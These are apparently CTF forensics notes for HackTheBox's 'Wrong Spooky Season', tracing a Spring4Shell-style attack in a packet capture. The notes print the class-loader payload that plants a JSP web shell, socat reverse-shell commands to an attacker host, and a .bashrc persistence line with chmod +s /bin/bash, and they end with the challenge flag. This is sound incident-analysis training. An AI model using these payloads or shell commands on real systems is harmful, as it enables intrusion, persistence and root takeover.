---
id: a2vpkxlzyz7sqs2no5equsk
title: Wrong Spooky Season
desc: ''
updated: 1666463926160
created: 1666461382622
tags:
  - hackthebox
  - pcap
  - wireshark
  - forensics
---

- Looking for XSS:

  ```text
  http.content_type == "application/x-www-form-urlencoded"
  ```

  Returned 3 packets: 335, 353, and 387.

  Packet #353 is the most interesting, it has a data length of 775:

  ```text
  class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=e4d1c32a56ca15b3&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
  ```

- Ran lots of requests with Python:

  ```text
  http.user_agent == "python-requests/2.28.1"
  ```

- The `.jsp` file is a reverse shell:

  ```text
  http.request.uri contains ".jsp"
  ```

- Command execution in packet 416 via JSP:

  ```text
  http://192.168.1.166:8080/e4d1c32a56ca15b3.jsp?cmd=whoami
  ```

  Returned that the user is `root` in packet 418.

  Confirmed additionally in #426/428, which executed and got the response of `id`.

- Installed `socat` on the machine in packet 436:

  ```text
  http://192.168.1.166:8080/e4d1c32a56ca15b3.jsp?cmd=apt%20-y%20install%20socat
  ```

  Confirmed successful in packet 456.

- Ran `socat` in packet 464:

  ```text
  http://192.168.1.166:8080/e4d1c32a56ca15b3.jsp?cmd=socat%20TCP:192.168.1.180:1337%20EXEC:bash
  ```

- Following the TCP packets after 464, the commands were:
  - `id`: `uid=0(root) gid=0(root) groups=0(root)`
  - `groups`: `root`
  - `uname -r`: `5.18.0-kali7-amd64`
  - `cat /etc/passwd`:

    ```log
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
    ```
  - `find / -perm -u=s -type f 2>/dev/null`:

    ```log
    /bin/su
    /bin/umount
    /bin/mount
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/bin/newgrp
    /usr/bin/chfn
    /usr/bin/gpasswd
    /usr/bin/passwd
    /usr/bin/chsh
    ```
  - `echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash`
  - `ls -lh`:

    ```log
    total 20K
    drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .
    drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..
    -rwxrwx--- 1 root root 1.8K Oct  8 00:04 pom.xml
    drwxr-xr-x 3 root root 4.0K Oct 10 17:27 src
    drwxr-xr-x 1 root root 4.0K Oct 10 17:28 target
    ```

The flag is the reversed base64 string decoded:

```text
HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```
